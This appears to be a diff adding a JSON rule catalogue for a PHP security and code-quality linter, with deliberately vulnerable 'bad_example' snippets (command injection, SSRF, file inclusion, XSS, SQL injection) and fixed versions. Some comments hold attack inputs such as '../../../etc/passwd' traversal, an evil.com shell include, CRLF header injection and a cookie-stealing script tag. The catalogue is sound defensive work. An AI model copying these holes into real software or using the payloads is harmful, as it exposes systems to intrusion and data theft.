@@ -1,0 +1,1888 @@
+{
+  "rules": [
+    {
+      "rule_code": "E0000",
+      "title": "E0000: Example rule",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0000 violations"
+      ]
+    },
+    {
+      "rule_code": "E0001",
+      "title": "E0001: Opening tag position",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "<?php\n// There is an empty blank line before the opening tag!\necho \"Hello World\";",
+      "good_example": "<?php\ndeclare(strict_types=1);\n\nnamespace App;\n\necho \"Hello World\";",
+      "severity": "major",
+      "category": "configuration",
+      "what_it_checks": [
+        "Ensures `<?php` or `<?=` is on line 1 of the file.",
+        "Ensures the opening tag starts at column 1 (no leading indentation/spaces).",
+        "Automatically allows Unix shebang (`#!...`) lines in CLI scripts on line 1."
+      ]
+    },
+    {
+      "rule_code": "E0010",
+      "title": "E0010: Npath complexity",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0010 violations"
+      ]
+    },
+    {
+      "rule_code": "E0100",
+      "title": "E0100: Variable function call",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$func = $_GET['func'] ?? '';\n$func();\ncall_user_func($func, $arg);",
+      "good_example": "$func = $_GET['func'] ?? '';\n$allowed = ['strlen', 'md5', 'sha1'];\nif (!in_array($func, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$func($input);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`$func()` where `$func` is assigned from tainted superglobals",
+        "`call_user_func($func, ...)` where `$func` is tainted",
+        "`call_user_func_array($func, ...)` where `$func` is tainted"
+      ]
+    },
+    {
+      "rule_code": "E0101",
+      "title": "E0101: Object injection via unserialize",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$data = $_GET['data'] ?? '';\n$result = unserialize($data);",
+      "good_example": "// Use JSON instead of PHP serialization for untrusted data\n$data = $_GET['json'] ?? '';\n$result = json_decode($data, true);\nif (json_last_error() !== JSON_ERROR_NONE) {\n    http_response_code(400);\n    exit;\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`unserialize()` calls where the argument may originate from `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, `php://input`",
+        "`session_decode()` with user-controlled data"
+      ]
+    },
+    {
+      "rule_code": "E0102",
+      "title": "E0102: Command injection via proc_open",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$cmd = $_GET['cmd'] ?? '';\n$descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];\n$process = proc_open($cmd, $descriptors, $pipes);",
+      "good_example": "$cmd = $_GET['cmd'] ?? '';\n$allowed = ['ls', 'whoami', 'date'];\n$base = explode(' ', $cmd)[0] ?? '';\nif (!in_array($base, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$process = proc_open(escapeshellcmd($cmd), $descriptors, $pipes);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`proc_open()` calls where the command string contains tainted input",
+        "`proc_open()` with user-controlled command arguments without `escapeshellarg()`"
+      ]
+    },
+    {
+      "rule_code": "E0103",
+      "title": "E0103: Server-side request forgery",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$url = $_GET['url'] ?? '';\n$result = file_get_contents($url);\n// or\n$ch = curl_init($url);\ncurl_exec($ch);",
+      "good_example": "$url = $_GET['url'] ?? '';\n$parsed = parse_url($url);\nif (!in_array($parsed['scheme'] ?? '', ['http', 'https'], true)) {\n    http_response_code(400);\n    exit;\n}\n$allowedHosts = ['api.example.com', 'cdn.example.com'];\nif (!in_array($parsed['host'] ?? '', $allowedHosts, true)) {\n    http_response_code(400);\n    exit;\n}\n$result = file_get_contents($url);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`file_get_contents()`, `curl_init()`, `curl_exec()`, `fopen()`, `fsockopen()` with tainted URLs",
+        "HTTP client libraries (Guzzle, Symfony HttpClient) with user-controlled URLs"
+      ]
+    },
+    {
+      "rule_code": "E0104",
+      "title": "E0104: HTTP response splitting",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$redirect = $_GET['redirect'] ?? '';\nheader(\"Location: $redirect\");\n// ?redirect=http://evil.com%0d%0aSet-Cookie: session=evil",
+      "good_example": "$redirect = $_GET['redirect'] ?? '';\n$redirect = str_replace([\"\\r\", \"\\n\"], '', $redirect);\n$allowed = ['/dashboard', '/profile'];\nif (!in_array($redirect, $allowed, true)) {\n    $redirect = '/dashboard';\n}\nheader(\"Location: $redirect\");",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`header()` calls with tainted input that may contain CRLF sequences",
+        "`setcookie()` with tainted values that may contain newlines"
+      ]
+    },
+    {
+      "rule_code": "E0105",
+      "title": "E0105: Local file inclusion",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$page = $_GET['page'] ?? '';\ninclude __DIR__ . '/pages/' . $page . '.php';",
+      "good_example": "$page = $_GET['page'] ?? '';\n$allowed = ['home', 'about', 'contact'];\nif (!in_array($page, $allowed, true)) {\n    $page = 'home';\n}\ninclude __DIR__ . '/pages/' . $page . '.php';",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`include`, `require`, `include_once`, `require_once` with paths built from tainted input",
+        "`file_get_contents()`, `file()`, `readfile()`, `fopen()` with tainted paths",
+        "`../` or null byte (`%00`) sequences in user-controlled paths"
+      ]
+    },
+    {
+      "rule_code": "E0106",
+      "title": "E0106: Deserialization of untrusted data",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$data = $_GET['data'] ?? '';\n$result = unserialize($data);\n// or\n$result = wddx_deserialize($data);",
+      "good_example": "// Use JSON instead of PHP serialization or WDDX for untrusted data\n$data = $_GET['json'] ?? '';\n$result = json_decode($data, true);\nif (json_last_error() !== JSON_ERROR_NONE) {\n    http_response_code(400);\n    exit;\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`unserialize()` calls with tainted input from superglobals",
+        "`wddx_deserialize()` calls with any argument (inherently dangerous)",
+        "`session_decode()` with user-controlled data"
+      ]
+    },
+    {
+      "rule_code": "E0107",
+      "title": "E0107: Weak random for security tokens",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$token = bin2hex(mt_rand(100000, 999999)); // predictable\n$resetToken = uniqid();                    // guessable",
+      "good_example": "$token = bin2hex(random_bytes(16));   // cryptographically secure\n$resetToken = random_int(100000, 999999); // cryptographically secure",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`rand()`, `mt_rand()`, `uniqid()` used for security-sensitive purposes (tokens, keys, salts)",
+        "`mt_rand()` or `rand()` assigned to variables named `token`, `key`, `secret`, `salt`, `nonce`, `csrf`"
+      ]
+    },
+    {
+      "rule_code": "E0108",
+      "title": "E0108: Dynamic instantiation",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$class = $_GET['class'] ?? '';\n$obj = new $class();",
+      "good_example": "$class = $_GET['class'] ?? '';\n$allowed = ['User', 'Product', 'Order'];\nif (!in_array($class, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$obj = new $class();",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`new $class()` where `$class` comes from superglobal array access",
+        "`ReflectionClass::newInstanceArgs()` with tainted class name",
+        "`class_exists()` followed by instantiation of user-controlled class names"
+      ]
+    },
+    {
+      "rule_code": "E0109",
+      "title": "E0109: Directory listing exposure",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$dir = $_GET['dir'] ?? '';\n$files = scandir($dir);\n// ?dir=../../../etc/ or ?dir=../../../var/www/config/",
+      "good_example": "$dir = $_GET['dir'] ?? '';\n$allowedDirs = ['/var/www/uploads/', '/var/www/assets/'];\n$realDir = realpath($dir);\nif (!$realDir || !in_array($realDir, $allowedDirs, true)) {\n    http_response_code(400);\n    exit;\n}\n$files = scandir($realDir);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`opendir()`, `readdir()`, `scandir()`, `glob()` with user-controlled directory paths",
+        "Directory traversal patterns (`../`) in directory arguments"
+      ]
+    },
+    {
+      "rule_code": "E0011",
+      "title": "E0011: Detect the error suppression symbol: @",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "// Suppressing errors when reading a file or calling a risky function\n$content = @file_get_contents($filename);\n@$this->connectDatabase();",
+      "good_example": "// Handle errors explicitly using conditionals, try/catch, or validation\nif (file_exists($filename)) {\n    $content = file_get_contents($filename);\n} else {\n    throw new FileNotFoundException(\"File not found: $filename\");\n}\n\ntry {\n    $this->connectDatabase();\n} catch (DatabaseException $e) {\n    Log::error(\"Database connection failed: \" . $e->getMessage());\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Scans expressions and return statements for the error control unary prefix operator (`@`)."
+      ]
+    },
+    {
+      "rule_code": "E0110",
+      "title": "E0110: Raw SQL query execution",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$id = $_GET['id'] ?? '';\n$result = $pdo->query(\"SELECT * FROM users WHERE id = $id\");",
+      "good_example": "$id = $_GET['id'] ?? '';\n$stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->execute([$id]);\n$user = $stmt->fetch();",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`PDO::query()`, `mysqli_query()`, `pg_query()` with SQL strings containing interpolated variables",
+        "SQL queries built by string concatenation with user input"
+      ]
+    },
+    {
+      "rule_code": "E0111",
+      "title": "E0111: Deprecated mysql extension",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$conn = mysql_connect('localhost', 'user', 'pass');\nmysql_select_db('mydb', $conn);\n$result = mysql_query(\"SELECT * FROM users WHERE id = $id\");\nmysql_fetch_assoc($result);",
+      "good_example": "// Use PDO or MySQLi with prepared statements\n$pdo = new PDO('mysql:host=localhost;dbname=mydb', 'user', 'pass');\n$stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->execute([$id]);\n$user = $stmt->fetch();",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`mysql_connect()`, `mysql_pconnect()`, `mysql_select_db()`, `mysql_query()`, `mysql_fetch_assoc()`, `mysql_fetch_array()`, `mysql_num_rows()`, `mysql_real_escape_string()`, `mysql_error()`, `mysql_errno()`",
+        "Any function with the `mysql_` prefix (except `mysqlnd` which is a driver, not the extension)"
+      ]
+    },
+    {
+      "rule_code": "E0112",
+      "title": "E0112: File upload without validation",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $_FILES['file']['name']);",
+      "good_example": "$allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$finfo = new finfo(FILEINFO_MIME_TYPE);\n$mime = $finfo->file($_FILES['file']['tmp_name']);\nif (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'], true)) {\n    http_response_code(400);\n    exit;\n}\n$filename = bin2hex(random_bytes(16)) . '.' . $ext;\nmove_uploaded_file($_FILES['file']['tmp_name'], '/var/www/protected_uploads/' . $filename);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`move_uploaded_file()` without prior extension/MIME validation",
+        "`file_put_contents()` with `$_FILES` data",
+        "`$_FILES['name']` used directly in file paths"
+      ]
+    },
+    {
+      "rule_code": "E0113",
+      "title": "E0113: Session regeneration missing",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "session_start();\n// Verify credentials...\n$_SESSION['user_id'] = $user->id;\n// No session_regenerate_id() after login",
+      "good_example": "session_start();\n// Verify credentials...\n$_SESSION['user_id'] = $user->id;\nsession_regenerate_id(true); // Fixation protection",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`session_start()` followed by `$_SESSION` writes without a subsequent `session_regenerate_id()`",
+        "Login/auth endpoints that set session data without regenerating the ID"
+      ]
+    },
+    {
+      "rule_code": "E0114",
+      "title": "E0114: PHP info disclosure",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "<?php phpinfo(); ?>",
+      "good_example": "// Remove phpinfo() entirely from production code\n// Use it only in local development, never commit it",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`phpinfo()` function calls anywhere in committed source code",
+        "`phpinfo(INFO_ALL)` or `phpinfo(INFO_GENERAL)` etc."
+      ]
+    },
+    {
+      "rule_code": "E0115",
+      "title": "E0115: XXE via libxml",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$xml = $_GET['xml'] ?? '';\n$doc = new DOMDocument();\n$doc->loadXML($xml, LIBXML_NOENT); // resolves external entities\n// or\n$xml = simplexml_load_string($xml); // external entities resolved by default",
+      "good_example": "libxml_disable_entity_loader(true); // PHP < 8.0\n$doc = new DOMDocument();\n$doc->loadXML($xml, LIBXML_NONET | LIBXML_NOWARNING);\n// PHP 8.0+: use XMLReader which doesn't resolve external entities by default\n$reader = new XMLReader();\n$reader->xml($xml);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`simplexml_load_string()`, `DOMDocument::loadXML()`, `DOMDocument::load()` with tainted input and `LIBXML_NOENT` or without `LIBXML_NONET`",
+        "`xml_parser_create()` / `xml_parse()` with default entity handling"
+      ]
+    },
+    {
+      "rule_code": "E0116",
+      "title": "E0116: Remote command execution via popen",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$cmd = $_GET['cmd'] ?? '';\n$handle = popen($cmd, 'r');\necho fread($handle, 4096);\npclose($handle);",
+      "good_example": "// Avoid popen() entirely. Use PHP-native functions instead.\n// If you must run a command, validate strictly and escape:\n$cmd = $_GET['cmd'] ?? '';\n$allowed = ['whoami', 'date', 'uptime'];\n$base = explode(' ', $cmd)[0] ?? '';\nif (!in_array($base, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$handle = popen(escapeshellcmd($cmd), 'r');",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`popen()` calls where the command string contains tainted input from superglobals",
+        "`popen()` with user-controlled command arguments without `escapeshellcmd()` or `escapeshellarg()`"
+      ]
+    },
+    {
+      "rule_code": "E0117",
+      "title": "E0117: SQL injection via query string",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$id = $_GET['id'] ?? '';\n$result = mysqli_query($conn, \"SELECT * FROM users WHERE id = $id\");",
+      "good_example": "$id = $_GET['id'] ?? '';\n$stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->execute([$id]);\n$user = $stmt->fetch();",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`mysqli_query()`, `PDO::query()`, `pg_query()` with SQL strings containing `$_GET` variables",
+        "SQL queries built by string concatenation with query string input"
+      ]
+    },
+    {
+      "rule_code": "E0118",
+      "title": "E0118: Log forging via user input",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "error_log(\"User {$_GET['username']} logged in\");\n// ?username=admin%0d%0aInjection: fake admin login",
+      "good_example": "$username = str_replace([\"\\r\", \"\\n\"], '', $_GET['username'] ?? '');\nerror_log(\"User $username logged in\");",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`error_log()`, `syslog()`, `trigger_error()` with tainted superglobals directly interpolated",
+        "Custom log writers (`file_put_contents($log, $user_input)`) with user input"
+      ]
+    },
+    {
+      "rule_code": "E0119",
+      "title": "E0119: Session cookie without Secure flag",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "session_set_cookie_params([\n    'secure' => false,    // sent over HTTP\n    'httponly' => true,\n]);\nsession_start();",
+      "good_example": "session_set_cookie_params([\n    'secure' => true,     // HTTPS only\n    'httponly' => true,   // not accessible via JavaScript\n    'samesite' => 'Lax',\n]);\nsession_start();",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`session_set_cookie_params()` with `secure => false` or not setting `secure`",
+        "`ini_set('session.cookie_secure', '0')` or not setting it at all",
+        "Session cookies created without the Secure attribute"
+      ]
+    },
+    {
+      "rule_code": "E0012",
+      "title": "E0012: Service compatibility with Shared Memory Model",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "namespace App\\Service;\n\nclass UserService {\n    private string $currentUser;\n\n    public function handleRequest(Request $request): void {\n        // Mutating $this state in a long-running worker!\n        $this->currentUser = $request->get('user'); \n        $this->process();\n    }\n}",
+      "good_example": "namespace App\\Service;\n\nclass UserService {\n    // Pass state as method parameters instead of storing in $this\n    public function handleRequest(Request $request): void {\n        $user = $request->get('user');\n        $this->process($user);\n    }\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Scans classes in configured namespaces (`App\\Service\\`, `App\\Controller\\`).",
+        "Detects assignments to `$this->property` or static properties (`self::$prop`) inside methods (excluding constructors).",
+        "Allows classes that implement a reset interface (e.g., `ResetInterface`) designed to clear state between requests."
+      ]
+    },
+    {
+      "rule_code": "E0120",
+      "title": "E0120: Eval with user-controlled string",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$code = $_GET['code'] ?? '';\neval(\"return $code;\");",
+      "good_example": "// Never eval user input. Use a whitelist-based dispatch instead.\n$action = $_GET['action'] ?? '';\n$allowed = ['list', 'view', 'search'];\nif (!in_array($action, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n// Handle each allowed action explicitly\nswitch ($action) {\n    case 'list':\n        listItems();\n        break;\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`eval()` calls where the string argument contains tainted input",
+        "String concatenation inside `eval()` with user-controlled variables"
+      ]
+    },
+    {
+      "rule_code": "E0121",
+      "title": "E0121: Assert with user-controlled string",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$condition = $_GET['condition'] ?? '';\nassert(\"$condition\");\n// ?condition=phpinfo() would execute phpinfo()",
+      "good_example": "// Use assert() only with boolean expressions, never strings\n$condition = filter_var($_GET['condition'] ?? '', FILTER_VALIDATE_BOOLEAN);\nassert($condition === true);\n\n// Or validate and branch explicitly\n$action = $_GET['action'] ?? '';\n$allowed = ['enable', 'disable'];\nif (!in_array($action, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`assert()` calls where the argument is a string containing tainted input",
+        "String concatenation inside `assert()` with user-controlled variables"
+      ]
+    },
+    {
+      "rule_code": "E0122",
+      "title": "E0122: File inclusion with user input",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$page = $_GET['page'] ?? '';\ninclude \"/var/www/pages/$page.php\";\n// ?page=../../../etc/passwd or ?page=http://evil.com/shell",
+      "good_example": "$page = $_GET['page'] ?? '';\n$allowed = ['home', 'about', 'contact'];\nif (!in_array($page, $allowed, true)) {\n    $page = 'home';\n}\ninclude \"/var/www/pages/$page.php\";",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`include`, `require`, `include_once`, `require_once` with paths containing tainted input",
+        "`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE` values used directly in include paths"
+      ]
+    },
+    {
+      "rule_code": "E0123",
+      "title": "E0123: XSS via echo",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$name = $_GET['name'] ?? '';\necho \"Hello, $name\";\n// ?name=<script>stealCookies()</script>",
+      "good_example": "$name = $_GET['name'] ?? '';\necho \"Hello, \" . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`echo`, `print`, `printf()`, `vprintf()` with tainted input",
+        "`<?=$var ?>` short echo tags with unescaped variables"
+      ]
+    },
+    {
+      "rule_code": "E0124",
+      "title": "E0124: Weak hash for passwords",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$hash = md5($password);       // weak, fast, unsalted\n$hash = sha1($password);      // weak, fast, unsalted\n$hash = crypt($password);     // weak, may use DES-based crypt",
+      "good_example": "$hash = password_hash($password, PASSWORD_DEFAULT);\n// Uses bcrypt or argon2 with automatic salting and cost factor\nif (password_verify($password, $hash)) {\n    // valid\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`md5()`, `sha1()`, `hash('md5', ...)`, `hash('sha1', ...)` applied to password-like variables",
+        "`crypt()` used for password hashing"
+      ]
+    },
+    {
+      "rule_code": "E0125",
+      "title": "E0125: Open redirect via header",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$url = $_GET['url'] ?? '';\nheader(\"Location: $url\");\nexit;",
+      "good_example": "$url = $_GET['url'] ?? '';\n$allowed = ['/dashboard', '/profile', '/login'];\nif (!in_array($url, $allowed, true)) {\n    $url = '/dashboard';\n}\nheader(\"Location: $url\");\nexit;",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`header(\"Location: ...\")` with tainted input",
+        "`header(\"refresh: ...;url=...\")` with tainted input"
+      ]
+    },
+    {
+      "rule_code": "E0126",
+      "title": "E0126: Path traversal via file_get_contents",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$file = $_GET['file'] ?? '';\necho file_get_contents(__DIR__ . '/uploads/' . $file);\n// ?file=../../../etc/passwd",
+      "good_example": "$file = $_GET['file'] ?? '';\n$allowed = ['avatar.jpg', 'profile.png'];\nif (!in_array($file, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\necho file_get_contents(__DIR__ . '/uploads/' . $file);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`file_get_contents()`, `file()`, `readfile()`, `fopen()` with paths built from tainted input",
+        "`../` or null byte (`%00`) sequences in user-controlled paths"
+      ]
+    },
+    {
+      "rule_code": "E0127",
+      "title": "E0127: Command execution via system",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$ip = $_GET['ip'] ?? '';\nsystem(\"ping -c 4 $ip\");",
+      "good_example": "$ip = $_GET['ip'] ?? '';\nif (!filter_var($ip, FILTER_VALIDATE_IP)) {\n    http_response_code(400);\n    exit;\n}\nsystem('ping -c 4 ' . escapeshellarg($ip));",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`system()`, `exec()`, `shell_exec()`, `passthru()` calls with tainted input",
+        "Backtick operator (`` `$cmd` ``) with tainted input (also covered by E0087)"
+      ]
+    },
+    {
+      "rule_code": "E0128",
+      "title": "E0128: Command execution via exec",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$cmd = $_GET['cmd'] ?? '';\nexec($cmd, $output);",
+      "good_example": "// Avoid exec() entirely. Use PHP-native functions instead.\n// If you must run a command, validate strictly and escape:\n$cmd = $_GET['cmd'] ?? '';\n$allowed = ['whoami', 'date', 'uptime'];\n$base = explode(' ', $cmd)[0] ?? '';\nif (!in_array($base, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\nexec(escapeshellcmd($cmd), $output);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`exec()` calls where the command string contains tainted input",
+        "`exec()` with user-controlled command arguments without escaping"
+      ]
+    },
+    {
+      "rule_code": "E0129",
+      "title": "E0129: Command execution via shell_exec",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$cmd = $_GET['cmd'] ?? '';\n$output = shell_exec($cmd);\necho $output;",
+      "good_example": "// Avoid shell_exec() entirely. Use PHP-native functions instead.\n// If you must run a command, validate strictly and escape:\n$cmd = $_GET['cmd'] ?? '';\n$allowed = ['whoami', 'date', 'uptime'];\n$base = explode(' ', $cmd)[0] ?? '';\nif (!in_array($base, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$output = shell_exec(escapeshellcmd($cmd));",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`shell_exec()` calls where the command string contains tainted input",
+        "`shell_exec()` with user-controlled command arguments without escaping"
+      ]
+    },
+    {
+      "rule_code": "E0013",
+      "title": "E0013: Private method not being called.",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "class OrderProcessor {\n    public function process(Order $order): void {\n        $this->validateOrder($order);\n    }\n\n    private function validateOrder(Order $order): void {\n        // ...\n    }\n\n    // Unused private method left over from refactoring\n    private function oldFormattingHelper(string $data): string {\n        return strtoupper($data);\n    }\n}",
+      "good_example": "class OrderProcessor {\n    public function process(Order $order): void {\n        $this->validateOrder($order);\n    }\n\n    private function validateOrder(Order $order): void {\n        // ...\n    }\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Scans all classes for methods marked `private`.",
+        "Inspects all method calls (`$this->methodName()`) within the class.",
+        "Reports any private method that is never referenced in any method body."
+      ]
+    },
+    {
+      "rule_code": "E0130",
+      "title": "E0130: Command execution via passthru",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$cmd = $_GET['cmd'] ?? '';\npassthru($cmd);",
+      "good_example": "// Avoid passthru() entirely. Use PHP-native functions instead.\n// If you must run a command, validate strictly and escape:\n$cmd = $_GET['cmd'] ?? '';\n$allowed = ['whoami', 'date', 'uptime'];\n$base = explode(' ', $cmd)[0] ?? '';\nif (!in_array($base, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\npassthru(escapeshellcmd($cmd));",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`passthru()` calls where the command string contains tainted input",
+        "`passthru()` with user-controlled command arguments without escaping"
+      ]
+    },
+    {
+      "rule_code": "E0131",
+      "title": "E0131: Command execution via proc_open",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$cmd = $_GET['cmd'] ?? '';\n$descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];\n$process = proc_open($cmd, $descriptors, $pipes);",
+      "good_example": "// Avoid proc_open() entirely. Use PHP-native functions instead.\n// If you must run a command, validate strictly and escape:\n$cmd = $_GET['cmd'] ?? '';\n$allowed = ['ls', 'whoami', 'date'];\n$base = explode(' ', $cmd)[0] ?? '';\nif (!in_array($base, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$process = proc_open(escapeshellcmd($cmd), $descriptors, $pipes);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`proc_open()` calls where the command string contains tainted input",
+        "`proc_open()` with user-controlled command arguments without `escapeshellarg()` or `escapeshellcmd()`"
+      ]
+    },
+    {
+      "rule_code": "E0132",
+      "title": "E0132: Header injection via header",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$status = $_GET['status'] ?? '';\nheader(\"X-Custom-Status: $status\");\n// ?status=ok%0d%0aSet-Cookie: session=evil",
+      "good_example": "$status = $_GET['status'] ?? '';\n$status = str_replace([\"\\r\", \"\\n\"], '', $status);\n$allowed = ['ok', 'error', 'pending'];\nif (!in_array($status, $allowed, true)) {\n    $status = 'ok';\n}\nheader(\"X-Custom-Status: $status\");",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`header()` calls with tainted input that may contain CRLF sequences",
+        "`header()` calls where user input is interpolated into the header value"
+      ]
+    },
+    {
+      "rule_code": "E0133",
+      "title": "E0133: Header injection via setcookie",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$name = $_GET['name'] ?? '';\nsetcookie($name, 'value');\n// ?name=session_id%0d%0aSet-Cookie: admin=true",
+      "good_example": "$name = $_GET['name'] ?? '';\n$name = str_replace([\"\\r\", \"\\n\"], '', $name);\n$allowed = ['theme', 'lang'];\nif (!in_array($name, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\nsetcookie($name, 'value', [\n    'secure' => true,\n    'httponly' => true,\n]);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`setcookie()` or `setrawcookie()` calls where the cookie name or value contains tainted input",
+        "Cookie names or values that may contain CRLF sequences"
+      ]
+    },
+    {
+      "rule_code": "E0134",
+      "title": "E0134: Mail injection via mail",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$email = $_GET['email'] ?? '';\nmail('admin@example.com', 'Contact Form', $message, \"From: $email\");\n// ?email=attacker@example.com%0d%0aBCC: victim@example.com",
+      "good_example": "$email = $_GET['email'] ?? '';\nif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {\n    http_response_code(400);\n    exit;\n}\n$headers = [\"From: webform@example.com\", \"Reply-To: $email\"];\nmail('admin@example.com', 'Contact Form', $message, implode(\"\\r\\n\", $headers));",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`mail()` calls where user input is passed to the `$additional_headers` parameter",
+        "`mail()` calls where user input is passed to the `$subject` parameter",
+        "CRLF sequences (`\\r\\n`) in mail headers or subject"
+      ]
+    },
+    {
+      "rule_code": "E0135",
+      "title": "E0135: PHP info disclosure",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "<?php phpinfo(); ?>",
+      "good_example": "// Remove phpinfo() entirely from production code\n// Use it only in local development, never commit it",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`phpinfo()` function calls anywhere in committed source code",
+        "`phpinfo(INFO_ALL)` or `phpinfo(INFO_GENERAL)` etc."
+      ]
+    },
+    {
+      "rule_code": "E0014",
+      "title": "E0014: Law of Demeter violation. Method chaining should be avoided unless returning the same object type.",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "major",
+      "category": "law-of-demeter",
+      "what_it_checks": [
